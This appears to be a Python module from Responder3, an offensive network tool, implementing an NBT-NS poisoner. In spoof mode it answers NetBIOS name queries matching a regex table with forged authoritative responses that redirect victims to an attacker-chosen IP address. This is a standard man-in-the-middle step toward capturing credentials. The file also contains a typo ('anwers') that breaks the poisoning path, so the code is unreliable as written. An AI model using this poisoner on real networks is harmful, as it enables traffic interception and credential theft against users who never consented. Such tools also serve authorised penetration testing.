import re
import socket
import struct
import logging
import asyncio
import ipaddress
import traceback
import collections

from responder3.core.sockets import setup_base_socket
from responder3.core.commons import PoisonerMode, ResponderPlatform
from responder3.protocols.NetBIOS import * 
from responder3.core.servertemplate import ResponderServer, ResponderServerSession, ResponderServerGlobalSession


class NBTNSGlobalSession(ResponderServerGlobalSession):
	def __init__(self, listener_socket_config, settings, log_queue):
		ResponderServerGlobalSession.__init__(self, log_queue, self.__class__.__name__)
		self.listener_socket_config = listener_socket_config
		self.settings = settings

		self.spooftable = collections.OrderedDict()
		self.poisonermode = PoisonerMode.ANALYSE

		self.parse_settings()

	def parse_settings(self):
		if self.settings is None:
			return
		else:
			# parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.poisonermode = PoisonerMode[self.settings['mode'].upper()]

			# compiling re strings to actual re objects and converting IP strings to IP objects
			if self.poisonermode == PoisonerMode.SPOOF:
				for entry in self.settings['spooftable']:
					for regx in entry:
						self.spooftable[re.compile(regx)] = ipaddress.ip_address(entry[regx])


class NBTNSSession(ResponderServerSession):
	def __init__(self, connection, log_queue):
		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)


class NBTNS(ResponderServer):
	@staticmethod
	def custom_socket(server_properties):
		sock = setup_base_socket(server_properties, bind_ip_override = ipaddress.ip_address('0.0.0.0'))
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
		return sock

	def init(self):
		self.parser = NBTNSPacket

	async def parse_message(self):
		msg = await asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
		return msg

	async def send_data(self, data, addr = None):
		await asyncio.wait_for(self.cwriter.write(data, addr), timeout=1)
		return

	async def run(self):
		try:
			msg = await asyncio.wait_for(self.parse_message(), timeout=1)
			if self.globalsession.poisonermode == PoisonerMode.ANALYSE:
				for q in msg.Questions:
					await self.logger.poisonresult(self.globalsession.poisonermode, requestName = q.QNAME.name, request_type = q.QTYPE.name)

			else: #poisoning
				answers = []
				for q in msg.Questions:
					for spoof_regx in self.globalsession.spooftable:
						spoof_ip = self.globalsession.spooftable[spoof_regx]
						if spoof_regx.match(q.QNAME.name.lower().strip()):
							await self.logger.poisonresult(self.globalsession.poisonermode, requestName = q.QNAME.name, poisonName = str(spoof_regx), poisonIP = spoof_ip, request_type = q.QTYPE.name)
							res = NBResource()
							res.construct(q.QNAME, NBRType.NB, spoof_ip)
							answers.append(res)
							break
						else:
							await self.logger.poisonresult(self.globalsession.poisonermode, requestName = q.QNAME.name, request_type = q.QTYPE.name)
				
				if anwers == []:
					return
				response = NBTNSPacket()
				response.construct(
					 TID = msg.NAME_TRN_ID, 
					 response = NBTSResponse.RESPONSE, 
					 opcode   = NBTNSOpcode.QUERY, 
					 nmflags  = NBTSNMFlags.AUTHORATIVEANSWER | NBTSNMFlags.RECURSIONDESIRED, 
					 answers  = answers
				)

				await asyncio.wait_for(self.send_data(response.to_bytes()), timeout =1)

		except Exception as e:
			raise e